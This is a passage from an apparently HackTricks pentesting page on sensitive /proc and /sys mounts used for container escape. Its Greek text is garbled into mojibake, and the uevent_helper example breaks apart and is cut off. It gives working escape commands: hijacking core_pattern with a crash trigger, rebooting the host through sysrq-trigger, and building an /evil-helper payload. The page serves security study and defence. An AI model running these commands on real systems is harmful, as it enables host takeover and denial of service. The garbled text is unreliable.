# Î•Ï…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Î¹ Î£Î·Î¼ÎµÎ¹Î±ÎºÎ¿Î¯ Î£ÏÎ½Î´ÎµÏƒÎ¼Î¿Î¹

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Î— Î­ÎºÎ¸ÎµÏƒÎ· Ï„Î¿Ï… `/proc` ÎºÎ±Î¹ Ï„Î¿Ï… `/sys` Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· Î±Ï€Î¿Î¼ÏŒÎ½Ï‰ÏƒÎ· namespace ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¿ÏÏ‚ ÎºÎ¹Î½Î´ÏÎ½Î¿Ï…Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Î·Ï‚ Ï„Î·Ï‚ Î±ÏÎ¾Î·ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÎµÏ€Î¹Ï†Î¬Î½ÎµÎ¹Î±Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î·Ï‚ Î±Ï€Î¿ÎºÎ¬Î»Ï…ÏˆÎ·Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½. Î‘Ï…Ï„Î¿Î¯ Î¿Î¹ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Î¹ Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï…, Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎºÎ±ÎºÏÏ‚ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î± Î® Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î·, Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎ¿Ï…Î½ ÏƒÎµ Î´Î¹Î±Ï†Ï…Î³Î® ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ, Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… host Î® Î½Î± Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Ï…Î½ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î· Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î· Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· `-v /proc:/host/proc` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± AppArmor Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Ï†ÏÏƒÎ·Ï‚ Ï„Î·Ï‚ Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î·Ï‚ ÏƒÎµ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚, Î±Ï†Î®Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ `/host/proc` Î±Ï€ÏÎ¿ÏƒÏ„Î¬Ï„ÎµÏ…Ï„Î¿.

**ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ Î³Î¹Î± ÎºÎ¬Î¸Îµ Ï€Î¹Î¸Î±Î½Î® ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÏƒÏ„Î¿** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Î•Ï…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ procfs

### `/proc/sys`

Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î³Î¹Î± Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ Ï„Î¿Ï… Ï€Ï…ÏÎ®Î½Î±, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¼Î­ÏƒÏ‰ `sysctl(2)`, ÎºÎ±Î¹ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î±ÏÎºÎµÏ„Î¿ÏÏ‚ Ï…Ï€Î¿ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚ Î±Î½Î·ÏƒÏ…Ï‡Î¯Î±Ï‚:

#### **`/proc/sys/kernel/core_pattern`**

* Î ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¿Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼ÏŒ ÎµÎ½ÏŒÏ‚ Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Ï„Î¬ Ï„Î·Î½ Ï€Î±ÏÎ±Î³Ï‰Î³Î® core-file Î¼Îµ Ï„Î± Ï€ÏÏÏ„Î± 128 bytes Ï‰Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± Î±Î½ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î±ÏÏ‡Î¯Î¶ÎµÎ¹ Î¼Îµ Î¼Î¹Î± ÏƒÏ‰Î»Î®Î½Î± `|`.
*   **Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î”Î¿ÎºÎ¹Î¼Î®Ï‚ ÎºÎ±Î¹ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Î”Î¿ÎºÎ¹Î¼Î® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # ÎŸÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿Ï… Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®
sleep 5 && ./crash & # Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®
```

#### **`/proc/sys/kernel/modprobe`**

* Î›ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ„Î¿ [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Î ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ Ï†Î¿ÏÏ„Ï‰Ï„Î® Î¼Î¿Î½Î¬Î´Ï‰Î½ Ï„Î¿Ï… Ï€Ï…ÏÎ®Î½Î±, Ï€Î¿Ï… ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î· Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Î¼Î¿Î½Î¬Î´Ï‰Î½ Ï€Ï…ÏÎ®Î½Î±.
*   **Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î•Î»Î­Î³Ï‡Î¿Ï… Î ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Î‘Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î¿ [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* ÎˆÎ½Î±Ï‚ Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î¿Ï‚ ÏƒÎ·Î¼Î±Î¯Î± Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Î½ Î¿ Ï€Ï…ÏÎ®Î½Î±Ï‚ Ï€Î±Î½Î¹ÎºÎ¿Î²Î¬Î»Î»ÎµÏ„Î±Î¹ Î® ÎºÎ±Î»ÎµÎ¯ Ï„Î¿Î½ OOM killer ÏŒÏ„Î±Î½ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ Î¼Î¹Î± ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· OOM.

#### **`/proc/sys/fs`**

* Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ ÎºÎ±Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½.
* Î— Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î¬ÏÎ½Î·ÏƒÎ·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ ÎºÎ±Ï„Î¬ Ï„Î¿Ï… host.

#### **`/proc/sys/fs/binfmt_misc`**

* Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎºÎ±Ï„Î±Ï‡ÏÏÎ¹ÏƒÎ· Î´Î¹ÎµÏÎ¼Î·Î½Î­Ï‰Î½ Î³Î¹Î± Î¼Î· ÎµÎ³Î³ÎµÎ½ÎµÎ¯Ï‚ Î´Ï…Î±Î´Î¹ÎºÎ­Ï‚ Î¼Î¿ÏÏ†Î­Ï‚ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¿Î½ Î¼Î±Î³Î¹ÎºÏŒ Ï„Î¿Ï…Ï‚ Î±ÏÎ¹Î¸Î¼ÏŒ.
* ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Î® Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ root shell Î±Î½ Ï„Î¿ `/proc/sys/fs/binfmt_misc/register` ÎµÎ¯Î½Î±Î¹ ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿.
* Î£Ï‡ÎµÏ„Î¹ÎºÎ® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎºÎ±Î¹ ÎµÎ¾Î®Î³Î·ÏƒÎ·:
* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Î£Îµ Î²Î¬Î¸Î¿Ï‚ tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Î†Î»Î»ÎµÏ‚ ÏƒÏ„Î¿ `/proc`

#### **`/proc/config.gz`**

* ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Î¿Ï… Ï€Ï…ÏÎ®Î½Î± Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Ï„Î¿ `CONFIG_IKCONFIG_PROC`.
* Î§ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î³Î¹Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎ¿Ï…Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏ„Î¿Î½ Ï„ÏÎ­Ï‡Î¿Î½Ï„Î± Ï€Ï…ÏÎ®Î½Î±.

#### **`/proc/sysrq-trigger`**

* Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ Sysrq, Ï€ÏÎ¿ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¬Î¼ÎµÏƒÎµÏ‚ ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î® Î¬Î»Î»ÎµÏ‚ ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚.
*   **Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î•Ï€Î±Î½ÎµÎºÎºÎ¯Î½Î·ÏƒÎ·Ï‚ Host**:

```bash
echo b > /proc/sysrq-trigger # Î•Ï€Î±Î½ÎµÎºÎºÎ¹Î½ÎµÎ¯ Ï„Î¿Î½ host
```

#### **`/proc/kmsg`**

* Î•ÎºÎ¸Î­Ï„ÎµÎ¹ Î¼Î·Î½ÏÎ¼Î±Ï„Î± Ï„Î¿Ï… Î´Î±ÎºÏ„Ï…Î»Î¯Î¿Ï… Ï„Î¿Ï… Ï€Ï…ÏÎ®Î½Î±.
* ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ ÏƒÎµ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚ Ï€Ï…ÏÎ®Î½Î±, Î´Î¹Î±ÏÏÎ¿Î­Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚.

#### **`/proc/kallsyms`**

* Î›Î¯ÏƒÏ„Î± ÏƒÏ…Î¼Î²ÏŒÎ»Ï‰Î½ Ï€Î¿Ï… ÎµÎ¾Î¬Î³Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Ï€Ï…ÏÎ®Î½Î± ÎºÎ±Î¹ Ï„Î¹Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï…Ï‚.
* Î‘Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Î½Î¬Ï€Ï„Ï…Î¾Î· ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÏ‰Î½ Ï€Ï…ÏÎ®Î½Î±, ÎµÎ¹Î´Î¹ÎºÎ¬ Î³Î¹Î± Ï„Î·Î½ Ï…Ï€Î­ÏÎ²Î±ÏƒÎ· Ï„Î¿Ï… KASLR.
* ÎŸÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï„Î¿ `kptr_restrict` ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ `1` Î® `2`.
* Î›ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ„Î¿ [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Î”Î¹Î±ÏƒÏÎ½Î´ÎµÏƒÎ· Î¼Îµ Ï„Î· ÏƒÏ…ÏƒÎºÎµÏ…Î® Î¼Î½Î®Î¼Î·Ï‚ Ï„Î¿Ï… Ï€Ï…ÏÎ®Î½Î± `/dev/mem`.
* Î™ÏƒÏ„Î¿ÏÎ¹ÎºÎ¬ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÏƒÎµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.
* Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± ÏƒÏ„Î¿ [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Î‘Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Ï„Î· Ï†Ï…ÏƒÎ¹ÎºÎ® Î¼Î½Î®Î¼Î· Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ ÏƒÎµ Î¼Î¿ÏÏ†Î® ELF core.
* Î— Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Î¼Î½Î®Î¼Î·Ï‚ Ï„Î¿Ï… host ÎºÎ±Î¹ Î¬Î»Î»Ï‰Î½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ.
* Î¤Î¿ Î¼ÎµÎ³Î¬Î»Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚ Î® ÎºÏÎ±ÏƒÎ¬ÏÎ¹ÏƒÎ¼Î± Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï.
* Î›ÎµÏ€Ï„Î¿Î¼ÎµÏÎ®Ï‚ Ï‡ÏÎ®ÏƒÎ· ÏƒÏ„Î¿ [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Î•Î½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Î´Î¹Î±ÏƒÏÎ½Î´ÎµÏƒÎ· Î³Î¹Î± Ï„Î¿ `/dev/kmem`, Ï€Î¿Ï… Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® Î¼Î½Î®Î¼Î· Ï„Î¿Ï… Ï€Ï…ÏÎ®Î½Î±.
* Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· ÎºÎ±Î¹ ÎµÎ³Î³ÏÎ±Ï†Î®, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î¬Î¼ÎµÏƒÎ· Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î·Ï‚ Î¼Î½Î®Î¼Î·Ï‚ Ï„Î¿Ï… Ï€Ï…ÏÎ®Î½Î±.

#### **`/proc/mem`**

* Î•Î½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Î´Î¹Î±ÏƒÏÎ½Î´ÎµÏƒÎ· Î³Î¹Î± Ï„Î¿ `/dev/mem`, Ï€Î¿Ï… Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Ï„Î· Ï†Ï…ÏƒÎ¹ÎºÎ® Î¼Î½Î®Î¼Î·.
* Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· ÎºÎ±Î¹ ÎµÎ³Î³ÏÎ±Ï†Î®, Î· Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏŒÎ»Î·Ï‚ Ï„Î·Ï‚ Î¼Î½Î®Î¼Î·Ï‚ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î·Î½ ÎµÏ€Î¯Î»Ï…ÏƒÎ· ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÏÎ½ ÏƒÎµ Ï†Ï…ÏƒÎ¹ÎºÎ­Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚.

#### **`/proc/sched_debug`**

* Î•Ï€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï Î´Î¹ÎµÏÎ³Î±ÏƒÎ¹ÏÎ½, Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚ Ï„Î¿Ï… PID namespace.
* Î•ÎºÎ¸Î­Ï„ÎµÎ¹ Î¿Î½ÏŒÎ¼Î±Ï„Î± Î´Î¹ÎµÏÎ³Î±ÏƒÎ¹ÏÎ½, IDs ÎºÎ±Î¹ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ cgroup.

#### **`/proc/[pid]/mountinfo`**

* Î Î±ÏÎ­Ï‡ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î± ÏƒÎ·Î¼ÎµÎ¯Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ ÏƒÏ„Î¿ namespace ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Ï„Î·Ï‚ Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚.
* Î•ÎºÎ¸Î­Ï„ÎµÎ¹ Ï„Î· Î¸Î­ÏƒÎ· Ï„Î¿Ï… `rootfs` Î® Ï„Î·Ï‚ ÎµÎ¹ÎºÏŒÎ½Î±Ï‚ Ï„Î¿Ï… ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ.

### Î•Ï…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ `/sys`

#### **`/sys/kernel/uevent_helper`**

* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± `uevents` ÏƒÏ…ÏƒÎºÎµÏ…ÏÎ½ Ï€Ï…ÏÎ®Î½Î±.
* Î— ÎµÎ³Î³ÏÎ±Ï†Î® ÏƒÏ„Î¿ `/sys/kernel/uevent_helper` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î± ÏƒÎµÎ½Î¬ÏÎ¹Î± ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· `uevent`.
*   **Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚**: %%%bash

#### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Î’ÏÎ¯ÏƒÎºÎµÎ¹ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… host Î±Ï€ÏŒ Ï„Î¿ OverlayFS mount Î³Î¹Î± Ï„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ

